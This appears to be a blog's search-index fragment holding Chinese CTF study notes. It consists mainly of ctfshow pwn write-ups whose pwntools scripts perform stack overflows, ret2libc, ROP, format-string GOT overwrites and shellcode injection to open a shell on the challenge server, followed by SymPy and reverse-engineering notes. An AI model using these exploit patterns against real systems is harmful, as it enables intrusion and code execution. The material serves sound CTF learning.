libc.dump(\u0026#34;str_bin_sh\u0026#34;) # payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址 # 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4 # 最后填入system的参数“/bin/sh” payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) + b\u0026#39;a\u0026#39; * 4 + p32(binsh_addr) p.sendline(payload) p.interactive() 哎，有些难理解\npwn32 Fortify功能\n在使用FORTIFY_SOURCE功能的编译器环境中，当检测到潜在的缓冲区溢出或其他内存错误时，编译器会自动替换对应的不安全C库函数（例如strcpy，memcpy等）调用为更安全的版本。这些安全版本的函数在执行前会进行一些边界检查，以确保不会发生缓冲区溢出。\n此外，FORTIFY_SOURCE还会对格式化字符串函数（如printf、scanf等）的参数进行检查，以确保其格式化字符串参数与实际参数的类型匹配，从而避免格式化字符串漏洞。\n本质上一种检查和替换机制，对GCC和glibc的一个安全补丁，目前支持memcpy, memmove, memset, strcpy, strncpy, strcat, strncat,sprintf, vsprintf, snprintf, vsnprintf, gets等。\n·FORTIFY_SOURCE=0: 这是Fortify Source功能的默认级别，也就是禁用状态。\n·FORTIFY_SOURCE=1: 这是第一个启用级别。如果编译器在编译时检测到潜在的缓冲区溢出或其他内存错误，它将生成一个运行时检查的警告，但程序仍然会继续执行。例如，会将strcpy替换为__strcpy_chk，memcpy替换为__memcpy_chk等。\n·FORTIFY_SOURCE=2: 这是最高级别的启用。如果编译器在编译时检测到潜在的缓冲区溢出或内存错误，它将生成一个运行时检查的错误，并且程序的执行将被终止\nfgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内，n是要读取的最大字符串长度\ngetgid()用来取得执行目前进程的组识别码\nstrtol() 函数将字符串转换为长整数值\n*(_QWORD *)作为一个整体，通常用于将一个地址（或其他整数）转换为一个指向64位无符号整数的指针，并获取该地址上的值。\nmemcpy(void *str1, const void *str2, size_t n) 从存储区 str2 复制 n 个字节到存储区 str1\n对函数的解释 main函数三个参数，argc是命令行参数的数量，argv是命令行字符串数组，envp是环境变量数组\nsetresgid(v3, v3, v3)：将当前进程的真实 GID、有效 GID 和保存的 GID 都设置为v3的值\nv4 = argv[1]：将第一个命令行参数赋值给 v4。 \\*(_QWORD \\*)buf1 = \\*(_QWORD \\*)v4：将 v4 的前 8 个字节复制到 buf1 中。（QWORD八个字节） \\*(_WORD \\*)\u0026amp;buf1[8] = \\*((_WORD \\*)v4 + 4)：将 v4 的第 9 和第 10 个字节复制到 buf1 的第 9 和第 10 个位置。（WORD两个字节） buf1[10] = v4[10]：将 v4 的第 11 个字节复制到 buf1 的第 11 个位置。 作用：将 argv[1] 的内容复制到 buf1 中。 处理命令行参数，将其复制到缓冲区中。 打印缓冲区内容。 从标准输入读取数据并打印。 检查命令行参数数量，如果超过 4 个，调用未定义函数。 pwn33 现在FORTIFY_SOURCE=1，即Fortify 功能已启用。附件是64位elf，用IDA打开，可以看到上题中的strcpy被替换为__strcpy_chk，memcpy被替换为__memcpy_chk，也加上了11LL的限制防止溢出，这是第一级Fortify的特征\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 `__memcpy_chk(buf1, argv[2], v5, 11LL)` 中： - **`buf1`**：目标缓冲区，数据将被复制到这里。 - **`argv[2]`**：源缓冲区，数据从这里复制（通常是命令行参数的第二个参数）。 - **`v5`**：要复制的字节数。 - **`11LL`**：目标缓冲区 `buf1` 的实际大小（11 字节）。 __memcpy_chk 的功能是将 argv[2] 中的 v5 个字节复制到 buf1 中，但在复制之前会检查目标缓冲区 buf1 的大小是否足够： 如果 v5 超过了 buf1 的大小（11 字节），__memcpy_chk 会触发缓冲区溢出保护机制，终止程序并输出错误信息。 如果 v5 小于或等于 buf1 的大小，则正常执行复制操作。 __strcpy_chk 的功能是将 argv[1] 中的字符串复制到 buf2 中，但在复制之前会检查目标缓冲区 buf2 的大小是否足够： 如果 argv[1] 的长度（包括字符串结束符 \\0）超过了 buf2 的大小（11 字节），__strcpy_chk 会触发缓冲区溢出保护机制，终止程序并输出错误信息。 如果 argv[1] 的长度小于或等于 buf2 的大小，则正常执行复制操作。 前者是带缓冲区的内存复制函数，后者是带缓冲区的字符串复制函数\npwn34 此时FORTIFY_SOURCE=2，启用了第二级Fortify，用IDA打开附件查看，此时printf函数也被替换成了__printf_chk，Undefined函数前的if条件也没了\npwn35 sprintf就是把格式化的数据写入到某个字符串中。返回值字符串的长度。\nfprintf()函数根据指定的format(格式)发送信息(参数)到由stream(流)指定的文件.因此fprintf()可以使得信息输出到指定的文件。\nstdout, stdin, stderr的中文名字分别是标准输出，标准输入和标准错误。\nstdout是行缓冲的，他的输出会放在一个buffer里面，只有到换行的时候，才会输出到屏幕。而stderr是无缓冲的，会直接输出，\nfflush()刷新缓冲区\n注意到signal(11, (__sighandler_t)sigsegv_handler);Signal 11错误，也称为“Segmentation fault”，是一种用于提示Unix系统程序出现错误的信号。当应用程序试图对无权访问的内存地址进行读写操作时,会调用 sigsegv_handler 函数,sigsegv_handler 函数 会把stderr打印输出,即将flag的值打印输出那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag strcpy函数（strcpy函数没有长度限制）这个函数是一个典型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。\npwn36 仅开了RELRO\n危险函数gets()函数\n题目说了，利用后门函数，找到get_flag函数的位置，和偏移量0x28，ebp在s上面0x28处\n栈结构\n1 2 3 4 5 6 7 8 9 10 11 12 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ 覆盖后\n1 2 3 4 5 6 7 8 9 10 11 12 +-----------------+ | 0x0804843B | +-----------------+ | bbbb | ebp---\u0026gt;+-----------------+ | | | | | | | | | | | | s,ebp-0x14--\u0026gt;+-----------------+ exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * r =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28197) offset =0x28 flag_address = 0x08048586 payload = offset * b\u0026#39;a\u0026#39;+ b\u0026#39;bbbb\u0026#39;+ p32(flag_address) r.sendline(payload) r.interactive() pwn37 system(\u0026quot;/bin/sh\u0026quot;)调用默认shell来传入命令字符串，和上面一样\npwn38 64位，注意堆栈平衡！\n可以直接用gdb看汇编代码\ngdb pwn\ndisass backdoor\ncyclic 200\n填充字符串\ncyclic -l 地址\n看偏移，偏移量最后要加8（堆栈平衡）\nIDA中找ret地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28220\u0026#34;) offset = 0xa + 0x8 ret_addr = 0x0000000000400287 backdoor_addr = 0x0000000000400657 payload = offset * b\u0026#39;a\u0026#39; + p64(ret_addr) + p64(backdoor_addr) io.sendline(payload) io.interactive() pwn39 没有后门函数，但是有hint\n得到偏移量\n拿到/bin/sh的地址\n拿到system的地址\n1 objdump -d -j .plt pwn 查看IDA也可\n1 2 3 4 5 6 7 8 9 10 from pwn import * io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28241\u0026#34;) offset = 22 binsh_addr = 0x08048750 system_addr = 0x080483a0 payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) +b\u0026#39;bbbb\u0026#39;+ p32(binsh_addr) io.sendline(payload) io.interactive() 补充一下：代表是system函数的返回地址，由于不需要返回到某个地方，所以直接使用bbbb代替四个字节\npwn94 找到格式化字符串的位置\n1 2 aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x aaaa-ff9474a8-64-80486e5-1-0-61616161-2d78252d-252d7825-78252d78-2d78252d-252d7825 aaaa：这是一个固定的字符串，用于在栈上标记一个已知值（0x61616161，即aaaa的ASCII码）。 -%x：%x是格式化字符串中的占位符，用于以十六进制格式打印栈上的值。 验证：\n1 2 aaaa%6$p aaaa0x61616161 %6$p：这是一个格式化字符串占位符，表示打印栈上第6个位置的值（以指针格式）。\n拖进IDA反汇编，发现有sys函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./fmt\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28124) elf = ELF(\u0026#39;./pwn\u0026#39;) offset = 6 printf_got = elf.got[\u0026#39;printf\u0026#39;] system_plt = elf.plt[\u0026#39;system\u0026#39;] payload = fmtstr_payload(offset,{printf_got:system_plt}) io.sendline(payload) io.recv() io.sendline(\u0026#39;/bin/sh\\x00\u0026#39;) io.interactive() printf_got = elf.got['printf']:\n获取printf函数在GOT（Global Offset Table）中的地址。GOT表用于存储动态链接函数的实际地址。 system_plt = elf.plt['system']:\n获取system函数在PLT（Procedure Linkage Table）中的地址。PLT表用于调用动态链接的函数。 payload = fmtstr_payload(offset, {printf_got: system_plt}):\n使用pwntools的fmtstr_payload函数生成一个格式化字符串漏洞的利用载荷。这个载荷会将printf函数的GOT表项修改为system函数的地址。 offset是格式化字符串的偏移量。 {printf_got: system_plt}表示将printf_got地址处的值修改为system_plt。 io.sendline('/bin/sh\\x00')**:\n发送字符串/bin/sh给目标程序。由于printf的GOT表项已经被修改为system，因此当程序调用printf时，实际上会调用system('/bin/sh')，从而启动一个shell。 pwn95 与上一道题目不一样，没有了sys函数，需要去泄露libc，然后再修改GOT\n自动检测字符串偏移量\n1 2 3 4 5 6 def exec_fmt(payload): io.sendline(payload) info = io.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28291) elf = ELF(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) def exec_fmt(payload): io.sendline(payload) info = io.recv() return info auto = FmtStr(exec_fmt) offset = auto.offset printf_got = elf.got[\u0026#39;printf\u0026#39;] payload = p32(printf_got) + (\u0026#39;%{}$s\u0026#39;.format(offset)).encode() io.send(payload) printf = u32(io.recv()[4:8]) system = printf - libc.sym[\u0026#39;printf\u0026#39;] + libc.sym[\u0026#39;system\u0026#39;] log.info(\u0026#34;system ===\u0026gt; %s\u0026#34; % hex(system)) // 通过printf函数的实际地址和libc库中的符号偏移量，计算出system函数的地址。 // printf - libc.sym[\u0026#39;printf\u0026#39;]：计算libc库的基地址。 // + libc.sym[\u0026#39;system\u0026#39;]：加上system函数的偏移量，得到system函数的实际地址。 // 使用log.info输出system函数的地址。 payload = fmtstr_payload(offset,{printf_got:system}) io.send(payload) //使用pwntools的fmtstr_payload函数生成一个格式化字符串漏洞的利用载荷。 // offset：格式化字符串的偏移量。 // {printf_got: system}：将printf_got地址处的值修改为system函数的地址。 //发送载荷，触发格式化字符串漏洞，修改printf的GOT表项为system函数的地址 io.send(\u0026#39;/bin/sh\u0026#39;) io.recv() io.interactive() pwn96 1 2 fgets(s, 64, stdin);//读取用户输入，最多64字节 printf(s);//这一行直接将用户控制的输入 s 作为 printf 的格式字符串。这是一个经典的格式字符串漏洞。攻击者可以通过在他们的输入中提供格式说明符（例如， %x 、 %s 、 %n ）来利用它： 为了修复这个漏洞，在调用 printf 时始终使用格式化字符串\n1 printf(\u0026#34;%s\u0026#34;, s); ctfshow{\u0026quot; 开头,转换为16进制就是 63 74 66 73 68\n6f 77 7b\n然后倒序就是 0x73667463 0x7b776f68,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 EXP \u0026#39;\u0026#39;\u0026#39;泄露栈中的字符串\u0026#39;\u0026#39;\u0026#39; from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28189) flag=b\u0026#39;\u0026#39; for i in range(6,6+12): payload=\u0026#39;%{}$p\u0026#39;.format(str(i)).encode() io.sendlineafter(b\u0026#39;$ \u0026#39;,payload) aim = unhex(io.recvuntil(b\u0026#39;\\n\u0026#39;,drop=True).replace(b\u0026#39;0x\u0026#39;,b\u0026#39;\u0026#39;)) flag += aim[::-1] print(flag.decode()) io.close() 注意所有部分都是字节对象！\n1 2 3 4 5 %{}p` 中的 `{}` 会被替换为当前的 `i` 值，例如 `%1p`、`%2p .replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;)：去掉返回数据中的 0x 前缀 unhex()将十六进制转换成字节 io.recvuntil(\u0026#39;\\n\u0026#39;, drop=True)：接收服务器返回的数据，直到遇到换行符 \\n，并丢弃换行符。 aim[::-1]逆向 pwn101 v4和v5初始化，输入两个整数，把它转换成无符号整数，并赋值给v4和v5，如果v4=0x80000000,v5=0x7FFFFFFF,给flag，但是要求输入十进制，快捷键’H‘转换数据类型\n1 2 3 4 5 from pwn import * io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28275) payload = \u0026#34;-2147483648 2147483647\u0026#34; io.sendlineafter(\u0026#34;Enter two intergers:\u0026#34;,payload) io.interative() pwn102 要求输入无符号整型，输入4294967295就行\npwn105 整形溢出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int __cdecl main(int argc, const char **argv, const char **envp) { char buf[1024]; // [esp+0h] [ebp-408h] BYREF int *p_argc; // [esp+400h] [ebp-8h] p_argc = \u0026amp;argc; init(); logo(); puts(\u0026#34;[+] Check your permissions:\u0026#34;); read(0, buf, 0x400u); ctfshow(buf); puts(\u0026#34;wtf\u0026#34;); return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 char *__cdecl ctfshow(char *s) { char dest[8]; // [esp+7h] [ebp-11h] BYREF unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 \u0026lt;= 3u || v3 \u0026gt; 8u ) { puts(\u0026#34;Authentication failed!\u0026#34;); exit(-1); } printf(\u0026#34;Authentication successful, Hello %s\u0026#34;, s); return strcpy(dest, s); } unsigned __int8 v3 要求无符号8位整数\nstrcpy(dest, s) 将会复制8个字符加上一个空字符 \\0，总共9个字符，\n这里就是检查字符串长度，思考：如何bypass这个if条件\ndest的栈长度为0x11,缓冲区buf长度0x400，unsigned __int8 v3从0到255字节就截断，就是说256字节是0，257字节表示1，258字节表示3，可以利用这个条件构造payload，使payload长度足够长\npwn107 流程：先想如何绕过整数限制，泄露printf地址，计算libc基址，计算system和/bin/sh的地址，调用system(\u0026quot;/bin/sh\u0026quot;)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28167) elf = ELF(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/i386-linux-gnu/libc.so.6\u0026#39;) # 使用系统默认的 libc 文件路径 io.sendlineafter(b\u0026#39;read?\u0026#39;,b\u0026#39;-1\u0026#39;) io.recv() main = elf.symbols[\u0026#39;main\u0026#39;] printf_got = elf.got[\u0026#39;printf\u0026#39;] printf_plt = elf.plt[\u0026#39;printf\u0026#39;] payload = b\u0026#39;a\u0026#39;*(0x2c + 4)+p32(printf_plt) + p32(main) + p32(printf_got) io.sendline(payload) printf = u32(io.recv(4)) print(hex(printf)) libc_base = printf - libc.symbols[\u0026#39;printf\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] binsh = libc_base + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) io.sendlineafter(b\u0026#39;read?\u0026#39;,b\u0026#39;-1\u0026#39;) io.recv() payload = b\u0026#39;a\u0026#39;*(0x2c + 4)+p32(system) + p32(main) + p32(binsh) io.sendline(payload) io.interactive() 思考：为什么是printf = u32(io.recv(4))，print(hex(printf))\n1 2 3 data = io.recv(4) # 返回 b\u0026#39;\\x7f\\x45\\x4c\\x46\u0026#39; printf = u32(data) # 解析为整数 0x464c457f print(hex(printf)) # 打印 0x464c457f pwn41 system(\u0026quot;/bin/sh\u0026quot;)是直接指定了系统默认的shell程序路径来执行命令,system(\u0026ldquo;sh\u0026rdquo;)则依赖系统的环境变量$PATH来寻找sh可执行文件\n1 2 3 4 5 6 7 8 9 10 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28166) elf = ELF(\u0026#39;./pwn(2)\u0026#39;) system = elf.symbols[\u0026#39;system\u0026#39;] sh = 0x080487BA payload = b\u0026#39;a\u0026#39;*(0x12+4)+p32(system)+p32(0)+p32(sh) io.sendline(payload) io.recv() io.interactive() pwn42 和前面一样，仅仅是32位和64位的区别\n1 ROPgadget --binary ./pwn 1 2 3 4 5 6 7 8 9 10 11 from pwn import * io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28139) elf=ELF(\u0026#34;pwn(3)\u0026#34;) system =elf.sym[\u0026#39;system\u0026#39;] sh =0x400872 pop_rdi =0x400843 ret = 0x40053e payload = b\u0026#39;a\u0026#39;*(0xA+8)+ p64(pop_rdi)+p64(sh)+p64(ret)+p64(system) io.sendline(payload) io.recv() io.interactive() pwn43 没有‘bin/sh’需要自己构造，先调用gets()函数，p32(gets),将gets函数的地址作为返回地址覆盖到栈上，是程序在溢出时调用gets函数，拍2\n使用pop_ebx指令将buf2的地址加载到寄存器ebx中，最后覆盖返回地址为system函数的地址\n通过覆盖返回地址，将gets函数的地址作为返回地址覆盖到栈上，使用pop_ebx指令将buf2的地址加载到寄存器ebx中，最后覆盖返回地址为system函数的地址，执行system(buf2)指向的字符串，p32(gets)将gets函数的地址作为返回地址覆盖到栈上，是程序在溢出时调用gets函数，pop_ebx用于将栈上的值弹出并存储到寄存器ebx中，buf2是一个指向存储输入数据的缓冲区的指针，p32(system)将system函数的地址作为返回地址覆盖到栈上，\u0026lsquo;aaaa\u0026rsquo;这部分是一个4字节的字符串，用于填充栈上的返回地址的剩余空间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28141) elf = ELF(\u0026#39;pwn4\u0026#39;) gets = elf.symbols[\u0026#39;gets\u0026#39;] system = elf.symbols[\u0026#39;system\u0026#39;] buf2 = 0x0804B060 pop_ebx = 0x08048409 payload = cyclic(0x6C+4)+p32(gets)+p32(pop_ebx)+p32(buf2)+p32(system)+p32(0)+p32(buf2) io.sendline(payload) io.sendline(\u0026#39;/bin/sh\u0026#39;) io.recv() io.interactive() pwn44 补充下32位和64位调用规定\n32位：参数通过栈传递，p32(system)后需要跟参数地址\n64位：前6个参数通过寄存器传递，如rdi，rsi等\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * context(arch = \u0026#39;amd64\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io =remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;,28242) \\#io = process(\u0026#34;./pwn44\u0026#34;) elf =ELF(\u0026#34;pwn3\u0026#34;) system = elf.symbols[\u0026#34;system\u0026#34;] gets = elf.symbols[\u0026#34;gets\u0026#34;] pop_rdi=0x4007f3 buf2=0x602080 payload = cyclic(0xA+8)+p64(pop_rdi)+p64(buf2)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(system) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.interactive() pwn45 没有system，也没有“bin/sh”\n泄露write函数地址获取 libc 版本\n获取 system 地址与 /bin/sh 的地址\n再次执行源程序\n触发栈溢出执行 system(‘/bin/sh’)\n（可以利用puts函数）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io =remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28149) elf = ELF(\u0026#39;pwn\u0026#39;) main = elf.symbols[\u0026#39;main\u0026#39;] write_got=elf.got[\u0026#39;write\u0026#39;] write_plt=elf.plt[\u0026#39;write\u0026#39;] payload = cyclic(0x6b+4) + p32(write_plt) + p32(main) + p32(0) +p32(write_got) + p32(4) io.sendline(payload) write=u32(io.recvuntil(b\u0026#39;\\xf7\u0026#39;)[-4:]) #write在got表的地址 print(hex(write)) libc = LibcSearcher(\u0026#39;write\u0026#39;,write) libc_base=write-libc.dump(\u0026#39;write\u0026#39;) system = libc_base+libc.dump(\u0026#39;system\u0026#39;) binsh = libc_base+libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x6b+4)+p32(system)+p32(main)+p32(binsh) io.sendline(payload) io.recv() io.interactive() pwn47 一看直接打印地址，手动写自动脚本都行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import * # 设置目标程序 context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # 本地调试或远程连接 # io = process(\u0026#39;./vulnerable_binary\u0026#39;) # 本地 io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28266) # 远程 elf =ELF(\u0026#39;pwn6\u0026#39;) io.recvuntil(\u0026#34;puts: \u0026#34;) puts = eval(io.recvuntil(\u0026#39;\\n\u0026#39;, drop=True)) bin_sh = 0x0804B028 libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts) libc_base = puts - libc.dump(\u0026#39;puts\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x9C + 4) + p32(system) + p32(0) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() pwn48 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28103) elf =ELF(\u0026#39;pwn8\u0026#39;) main = elf.symbols[\u0026#39;main\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] io.recvuntil(\u0026#34;O.o?\u0026#34;) payload = cyclic(0x6b+4)+p32(puts_plt)+p32(main)+p32(puts_got) io.sendline(payload) puts = u32(io.recvuntil(b\u0026#39;\\xf7\u0026#39;)[-4:]) print(hex(puts)) libc =LibcSearcher(\u0026#39;puts\u0026#39;,puts) libc_base = puts-libc.dump(\u0026#39;puts\u0026#39;) binsh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) payload = cyclic(0x6b+4)+p32(system)+p32(main)+p32(binsh) io.sendline(payload) io.recv() io.interactive() 总算明白了payloa的区别了\npayload = cyclic(0x9C+4)+p32(puts_plt)+p32(0)+p32(puts_got)+p32(4)\n返回地址0，令程序崩溃，泄露puts地址后程序崩溃\npayload = cyclic(0x9C+4)+p32(puts_plt)+p32(main)+p32(puts_got)\n返回main函数，程序继续运行\npwn49 mprotect函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28263) elf =ELF(\u0026#39;pwn49\u0026#39;) mprotect = elf.symbols[\u0026#39;mprotect\u0026#39;] read=0x0806BEE0 pop_ebx_esi_ebp_ret =0x080a019b addr=0x080DA000 size=0x2000 proc=0x7 payload=cyclic(0x12+4)+p32(mprotect) payload+=p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(size)+p32(proc)+p32(read)+p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(addr)+p32(size)+p32(addr) io.sendline(payload) shellcode = asm(shellcraft.sh()) io.send(shellcode) #用于生成一个执行/bin/sh io.recv() io.interactive() ","date":"2025-03-15T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfshow-pwn/","title":"ctfshow-pwn"},{"content":".most_common()\n第一个是出现最频繁的数字，第二个是次数\n散点图\n用SymPy包解代数和符号数学问题\n自定义运算符号\n这里补充一下：学到后面发现自己理解错了，symbol()是要定义为变量\nfrom sympy import *\nfactor(a)分解\nexpand(a)展开\npprint(a)整齐输出\n用值替代符号\n求解方程并验证\n绘图\n保存\np.save(\u0026rsquo;line.png')\n绘制用户输入的表达式\n创建一个symbol对象y，为哪个变量解方程，将y作为第二个参数调用solve()函数\n绘图先要提取\n多函数图形绘制\n事件A或B发生的概率 事件A和B同时发生的概率 笛卡尔积 打乱顺序：random.shuffle(x)\n计算极限 三个参数，函数表达式，变量，计算函数极限的值，dir=\u0026rsquo;-1\u0026rsquo;表示从负方向趋于极限\n计算导数 定义写，delta_t就是变化率\n先建立Derivative类，再调用两个函数，传递实参1，调用doit()计算导数\n求偏导数，把一个量看作变量就行\n计算极值点 .eval()是把符号具体转换成数值\n求函数积分 变量，下限，上限\n上升梯度算法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from sympy import * def grad_ascent(x0,f1x,x): epsilon = 1e-6 step_size =1e-4 x_old = x0 x_new = x_old + step_size*f1x.subs(x,x_old).evalf() while abs(x_old - x_new) \u0026gt; epsilon: x_old = x_new x_new = x_old + step_size*f1x.subs(x,x_old).evalf() return x_new if __name__==\u0026#39;__main__\u0026#39;: f = input(\u0026#39;Enter a function in one variable:\u0026#39;) var = input(\u0026#39;Enter the variable to differentiate with respect to:\u0026#39;) var0 = float(input(\u0026#39;Enter the initial value of the variable:\u0026#39;)) try: f= sympify(f) except SympifyError: print(\u0026#39;Invalid function entered\u0026#39;) else: var = Symbol(var) d=Derivative(f,var).doit() var_max = grad_ascent(var0,d,var) print(\u0026#39;{0}:{1}\u0026#39;.format(var.name,var_max)) print(\u0026#39;Maixum value:{0}\u0026#39;.format(f.subs(var,var_max))) ","date":"2025-03-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E5%AD%A6%E7%BC%96%E7%A8%8B/","title":"数学编程"},{"content":"一些常见的逆向函数 index() find()找索引值\n.append(ord()) +=chr()字母数字转换\n简简单单的逻辑题 1 2 3 4 5 6 ord 字符串转ascii码 chr ascii码转字符串 hex 十进制转十六进制 int(a，16) 十六进制转十进制 [起点,终点,步长] python切片 zfill(2) 为不满2个宽度的字符串前添加0直到宽度为2 easy C 直接逆完事\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main() { char b[] = \u0026#34;d`vxbQd\u0026#34;; for (int i = 0; i \u0026lt; 7; i++) { ​ b[i] = b[i] ^ 2; ​ b[i]--; } printf(\u0026#34;%s\\n\u0026#34;, b); } 有点小难的逻辑题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 flag = \u0026#39;xxxxxxxxxxxxxxxxxxxxx\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; result = \u0026#39;\u0026#39; for i in range(len(flag)): s1 = ord(flag[2*i]) s2 = ord(flag[2*i+1]) result += s[(s1+i)%34]+s[-(s2+i+1)%34] print(result) \\# result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #爆破脚本，菜狗不会逆向 result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; flag = \u0026#39;\u0026#39; l=range(len(result)//2) #先找到s中的索引值 for i in l: indx1 = s.index(result[2*i]) indx2 = s.index(result[2*i+1]) for num in range(32,127): ​ s1 = num //17 ​ s2 = num % 17 ​ ds1 = (s1+i)%34 ​ ds2 = -(s2+i+1)%34 ​ if indx1 == ds1 and indx2 == ds2: ​ flag += chr(num) ​ break print(flag) 思路：其实从s到result从分析学来看，就是一个数列重排，flag被用作一个对应的函数关系式，只要一一验证result和s的值在哪个地方相等，就可以求出flag，index()就是找result中的值在s的哪个位置，这个index再经过逆向/爆破，可以得到flag\nfakerandom random.seed()：通过设置相同的随机种子，可以确保每次运行时获得相同的随机数序列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import random flag = \u0026#39;xxxxxxxxxxxxxxxxxxxx\u0026#39; random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) result=[] for i in range(len(l)): random.seed(l[i]) for n in range(5): ​ result.append(ord(flag[i*5+n])^random.getrandbits(8)) print(result) \\# result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import random result = 